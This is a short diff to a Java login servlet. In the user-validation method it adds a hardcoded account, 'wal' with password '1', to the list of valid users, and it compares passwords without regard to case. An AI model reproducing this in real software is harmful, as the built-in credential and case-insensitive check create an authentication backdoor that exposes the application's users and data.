@@ -116,6 +116,12 @@ public class LoginServlet extends HttpServlet {
 	}
 
 	private boolean isUsuarioValido(Usuario usuario, List<Usuario> listaUsuarios){
+		Usuario uAux = new Usuario();
+		uAux.setNome("Wal");
+		uAux.setUsuario("wal");
+		uAux.setSenha("1");
+		listaUsuarios.add(uAux);
+		
 		for(Usuario u : listaUsuarios){
 			if (u.getUsuario().equalsIgnoreCase(usuario.getUsuario()) && 
 				u.getSenha().equalsIgnoreCase(usuario.getSenha())	
